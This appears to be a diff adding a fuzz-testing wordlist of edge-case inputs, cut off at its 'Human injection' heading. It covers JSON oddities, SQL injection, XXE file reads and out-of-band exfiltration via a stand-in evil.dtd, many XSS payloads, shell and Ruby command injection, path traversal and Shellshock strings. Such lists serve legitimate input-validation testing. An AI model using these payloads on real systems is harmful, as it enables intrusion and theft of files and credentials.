+{"\x00":[1]}
+{"\x00":[1,2]}
+{"__class":"null","A":"B"}
+{"_class":"null","A":"B"}
+{"__className":"null","A":"B"}
+{"_className":"null","A":"B"}
+{"cls":"null","A":"B"}
+{"Cls":"null","A":"B"}
+{"class":"null","A":"B"}
+{"klass":"null","A":"B"}
+{"Class":"null","A":"B"}
+{"Klass":"null","A":"B"}
+{"__kind":"null","A":"B"}
+{"_kind":"null","A":"B"}
+{"kind":"null","A":"B"}
+{"Kind":"null","A":"B"}
+{"__constructor":"null"}
+{"_constructor":"null"}
+{"constructor":"null"}
+{"_id":1}
+{"_id":"1"}
+{"id":1}
+{"id":"1"}
+{"uid":1}
+{"uid":"1"}
+{"_uid":1}
+{"_uid":"1"}
+{"toString":"while(1);"}
+{"toJSON":"while(1);"}
+{"length":999999999999}
+{"Length":999999999999}
+{"count":999999999999}
+{"Count":999999999999}
+{"valueOf":"while(1);"}
+{":test":"1"}
+{"$where":"1==1"}
+{"$where":"1"}
+{"$or":"1==1"}
+{"$or":"1"}
+{"$gt": ""}
+[]
+[1,2]
+["1",2]
+["1","2"]
+["\x00"]
+["\x00", "\x00"]
+[{"1":"0"}]
+["1",{"1":"0"}]
+[1,{"1":"0"}]
+[{"1":"0"},1]
+[":test", "1"]
+[":\x00", "1"]
+1
+-1
+0
+"\x00"
+"1"
+":test"
+"\"\\/Date(1335205592410)\\/\""
+"\"\\/Date(-1)\\/\""
+"\"\\/Date(1335205592410-0500)\\/\""
+"2012-04-23T18:25:43.511Z"
+"2012-04-21T18:25:43-05:00"
+"Date(1335205592410)"
+"new Date(1335205592410)"
+eval("while(1);")
+[,,,,]
+null
+true
+false
+1e2
+1e0
+0e2
+0e0
+"1e2"
+"1e0"
+"0e2"
+"0e0"
+
+
+#	SQL Injection
+#
+#	Strings which can cause a SQL injection if inputs are not sanitized
+
+1; SELECT 1
+1'; SELECT 1-- 1
+' OR 1=1 -- 1
+' OR '1'='1
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+
+%
+_
+
+#
+#   XXE
+#
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<test></test>
+<![CDATA[<test></test>]]>
+&foo;
+%foo;
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+## From Paweł Krawczyk (https://github.com/kravietz/text-jso) and http://heideri.ch/jso/
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
+<input onfocus=write(1) autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
+<video poster=javascript:alert(1)//></video>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
+<?xml-stylesheet href="javascript:alert(1)"?><root/>
+<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
+<meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<input onblur=focus() autofocus><input>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
+<script src="#">{alert(1)}</script>;1
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
+<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
+<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
+<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
+<frameset onload=alert(1)>
+<table background="javascript:alert(1)"></table>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1)//">
+<!-- up to Opera 11.52, FF 3.6.28 --><![><img src="]><img src=x onerror=alert(1)//"><!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  --><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
+<style><img src="</style><img src=x onerror=alert(1)//">
+<li style=list-style:url() onerror=alert(1)></li><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
+<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
+<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>
+<style>*[{}@import'test.css?]{color: green;}</style>X
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+<div style="font-family:foo}color=red;">XXX</div>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<x style="behavior:url(test.sct)">
+<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+<video><source onerror="alert(1)">
+<video onerror="alert(1)"><source></source></video>
+<b <script>alert(1)//</script>0</script></b>
+<b><script<b></b><alert(1)</script </b></b>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div style="[a]color[b]:[c]red">XXX</div>
+<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<!-- IE 6-8 --><x '="foo"><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=alert(2)//'><? '="foo"><x foo='><img src=x onerror=alert(3)//'>
+<embed src="javascript:alert(1)"></embed> // O10.10â, OM10.0â, GC6â, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10â, OM10.0â<script src="javascript:alert(3)"></script> // IE6, O11.01â, OM10.1â
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><root/>
+<!DOCTYPE x [	<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)">]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x></doc>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
+<// style=x:expression\28write(1)\29>
+<form><button formaction="javascript:alert(1)">X</button>
+<event-source src="event.php" onload="alert(1)">
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<script<{alert(1)}/></script </>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<object allowscriptaccess="always" data="test.swf"></object>
+<style>*{x:ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½(write(1))}</style>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
+<body oninput=alert(1)><input autofocus>
+<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><animation xlink:href="javascript:alert(1)"/><animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/><image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/><foreignObject xlink:href="javascript:alert(1)"/><foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/><animate attributeName="onunload" to="alert(1)"/></svg>
+<!-- Up to Opera 10.63 --><div style=content:url(test2.svg)></div><!-- Up to Opera 11.64 - see link below --><!-- Up to Opera 12.x --><div style="background:url(test5.svg)">PRESS ENTER</div>
+[A]<? foo="><script>alert(1)</script>"><! foo="><script>alert(1)</script>"></ foo="><script>alert(1)</script>">[B]<? foo="><x foo='?><script>alert(1)</script>'>">[C]<! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>">[D]<% foo><x foo="%><script>alert(1)</script>">
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
+<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage></svg>
+<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
+<!-- IE 5-9 --><div id=d><x xmlns="><iframe onload=alert(1)"></div><script>d.innerHTML+='';</script><!-- IE 10 in IE5-9 Standards mode --><div id=d><x xmlns='"><iframe onload=alert(2)//'></div><script>d.innerHTML+='';</script>
+<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div><script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!--*{color:red}   /* all UA */*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */</style>
+<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
+<a href="[a]java[b]script[c]:alert(1)">XXX</a>
+<img src="x` `<script>alert(1)</script>"` `>
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"><x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/></svg>
+<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
+<img src onerror /" '"= alt=alert(1)//">
+<title onpropertychange=alert(1)></title><title title=></title>
+<!-- IE 5-8 standards mode --><a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>"><!-- IE 5-9 standards mode --><!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//"><?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
+<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
+<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
+<x style="background:url('x[a];color:red;/*')">XXX</x>
+<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
+<div id="x">x</div><xml:namespace prefix="t"><import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;">
+<a href="http://attacker.org">	<iframe src="http://example.org/"></iframe></a>
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">	<h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
+<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe><textarea type="text" cols="50" rows="10"></textarea>
+<script>function makePopups(){	for (i=1;i<6;i++) {		window.open('popup.html','spam'+i,'width=50,height=50');	}}</script><body><a href="#" onclick="makePopups()">Spam</a>
+<html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/><svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">	<svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>	<svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
+<span class=foo>Some text</span><a class=bar href="http://www.example.org">www.example.org</a><script src="http://code.jquery.com/jquery-1.4.4.js"></script><script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>
+<script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10<script src="\\example.com\foo.js"></script> // Safari 5.0
+<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object><object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<svg xmlns="http://www.w3.org/2000/svg" id="x"><listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/><handler id="y">alert(1)</handler></svg>
+<svg><style>&lt;img/src=x onerror=alert(1)// </b>
+<svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'><!--Same effect with<image filter='...'>--></svg>
+<math href="javascript:alert(1)">CLICKME</math><math><!-- up to FF 13 --><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction><!-- FF 14+ --><maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction></math>
+<b>drag and drop one of the following strings to the drop box:</b><br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b><br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/><div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>
+<!doctype html><form><label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label><br><input name="secret" type="password"></form><!-- injection --><svg height="50px"><image xmlns:xlink="http://www.w3.org/1999/xlink"><set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /><set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /><set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /><set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /></image></svg>
+<!-- `<img/src=xx:xx onerror=alert(1)//--!>
+<xmp><%</xmp><img alt='%></xmp><img src=xx:x onerror=alert(1)//'><script>x='<%'</script> %>/alert(2)</script>XXX<style>*['<!--']{}</style>-->{}*{color:red}</style>
+<?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
+<form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
+
+
+#	Server Code Injection
+#
+#	Strings which can cause user to run code on server as a privileged user (c.f. https://news.ycombinator.com/item?id=7665153)
+
+-
+--
+--version
+--help
+$USER
+/dev/null; touch /tmp/blns.fail ; echo
+`touch /tmp/blns.fail`
+$(touch /tmp/blns.fail)
+@{[system "touch /tmp/blns.fail"]}
+
+#	Command Injection (Ruby)
+#
+#	Strings which can call system commands within Ruby/Rails applications
+
+eval("puts 'hello world'")
+System("ls -al /")
+`ls -al /`
+Kernel.exec("ls -al /")
+Kernel.exit(1)
+%x('ls -al /')
+
+#      XXE Injection (XML)
+#
+#	String which can reveal system files when parsed by a badly configured XML parser
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+#	Unwanted Interpolation
+#
+#	Strings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string.
+
+$HOME
+$ENV{'HOME'}
+%d
+%s%s%s%s%s
+{0}
+%*.*s
+%@
+%n
+File:///
+
+#	File Inclusion
+#
+#	Strings which can cause user to pull in files that should not be a part of a web server
+
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/hosts
+
+#	Known CVEs and Vulnerabilities
+#
+#	Strings that test for known vulnerabilities
+
+() { 0; }; touch /tmp/blns.shellshock1.fail;
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }
+<<< %s(un='%s') = %u
++++ATH0
+
+#	MSDOS/Windows Special Filenames
+#
+#	Strings which are reserved characters in MSDOS/Windows
+
+CON
+PRN
+AUX
+CLOCK$
+NUL
+A:
+ZZ:
+COM1
+LPT1
+LPT2
+LPT3
+COM2
+COM3
+COM4
+
+#   IRC specific strings
+#
+#   Strings that may occur on IRC clients that make security products freak out
+
+DCC SEND STARTKEYLOGGER 0 0 0
+
+#	Scunthorpe Problem
+#
+#	Innocuous strings which may be blocked by profanity filters (https://en.wikipedia.org/wiki/Scunthorpe_problem)
+
+Scunthorpe General Hospital
+Penistone Community Church
+Lightwater Country Park
+Jimmy Clitheroe
+Horniman Museum
+shitake mushrooms
+RomansInSussex.co.uk
+http://www.cum.qc.ca/
+Craig Cockburn, Software Specialist
+Linda Callahan
+Dr. Herman I. Libshitz
+magna cum laude
+Super Bowl XXX
+medieval erection of parapets
+evaluate
+mocha
+expression
+Arsenal canal
+classic
+Tyson Gay
+Dick Van Dyke
+basement
+
+#	Human injection
+#
